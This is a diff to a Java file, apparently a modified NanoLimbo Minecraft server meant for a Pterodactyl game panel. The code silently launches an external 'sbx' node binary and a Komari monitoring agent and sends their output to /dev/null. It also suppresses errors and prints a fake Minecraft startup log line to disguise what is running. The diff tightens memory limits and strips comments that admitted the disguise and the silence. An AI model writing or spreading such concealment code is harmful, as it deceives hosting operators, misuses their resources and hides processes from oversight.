@@ -2,7 +2,7 @@
  * Copyright (C) 2020 Nan1t
  *
  * Java 8 compatible build for Pterodactyl Java game panel.
- * Totally Silent & Memory Optimized Edition
+ * Low Memory Limit Edition for Small Containers
  */
 package ua.nanit.limbo;
 
@@ -43,13 +43,13 @@ public final class NanoLimbo {
         }
 
         try {
-            // 1. 启动 sbsh 节点进程
+            // 1. 启动节点核心（极限限制 48MB 内存）
             runSbxBinary();
             
-            // 2. 错峰缓冲 5 秒，防止内存瞬间冲顶
+            // 2. 错峰缓冲 5 秒
             sleepQuietly(5000L);
 
-            // 3. 静默启动 Komari 探针
+            // 3. 启动探针（极限限制 16MB 内存）
             startKomariNativeAgentWithFallback();
 
             Runtime.getRuntime().addShutdownHook(new Thread(new Runnable() {
@@ -60,11 +60,8 @@ public final class NanoLimbo {
                 }
             }));
 
-            // 伪装打印，类似普通的 Minecraft 服务器启动完成日志
             System.out.println("[INFO] Done (1.854s)! For help, type \"help\"");
-        } catch (Exception e) {
-            // 保持静默，不向控制台抛出具体致命异常
-        }
+        } catch (Exception ignored) {}
 
         try {
             new LimboServer().start();
@@ -73,23 +70,19 @@ public final class NanoLimbo {
         }
     }
 
-    private static void clearConsole() {
-        // 留空，禁用清屏逻辑
-    }
+    private static void clearConsole() {}
 
     private static void runSbxBinary() throws Exception {
         Map<String, String> envVars = new HashMap<String, String>();
         loadEnvVars(envVars);
 
-        // 强行限制节点进程的最大物理内存为 96MB，防止容器爆内存被杀 (Exit 137)
-        envVars.put("GOMEMLIMIT", "96MiB");
-        envVars.put("GOGC", "30");
+        // 强行把 Go 进程内存上限压到 48MB，垃圾回收极为频繁，不占物理内存
+        envVars.put("GOMEMLIMIT", "48MiB");
+        envVars.put("GOGC", "15");
 
         ProcessBuilder pb = new ProcessBuilder(getBinaryPath().toString());
         pb.environment().putAll(envVars);
         pb.redirectErrorStream(true);
-        
-        // 丢弃所有节点日志输出，面板控制台完全不可见
         pb.redirectOutput(new File("/dev/null"));
         sbxProcess = pb.start();
     }
@@ -133,8 +126,6 @@ public final class NanoLimbo {
 
             cleanKomariEnv(pb.environment());
             pb.redirectErrorStream(true);
-            
-            // 丢弃探针原生的所有日志输出
             pb.redirectOutput(new File("/dev/null"));
 
             komariProcess = pb.start();
@@ -161,9 +152,9 @@ public final class NanoLimbo {
         }
         env.put("KOMARI_DISABLE_REMOTE_CONTROL", "true");
         
-        // 限制探针内存最大 32MB
-        env.put("GOMEMLIMIT", "32MiB");
-        env.put("GOGC", "20");
+        // 限制探针内存最大 16MB
+        env.put("GOMEMLIMIT", "16MiB");
+        env.put("GOGC", "10");
     }
 
     private static Path getKomariNativeAgentPath() throws IOException {
@@ -196,7 +187,6 @@ public final class NanoLimbo {
         return path;
     }
 
-    /** Java HTTP reporter fallback. Fully silent in background. */
     private static void startKomariHttpReporter(final String endpoint, final String token, final int interval, final String reason) {
         final String server = endpoint.endsWith("/") ? endpoint.substring(0, endpoint.length() - 1) : endpoint;
         komariReporterThread = new Thread(new Runnable() {
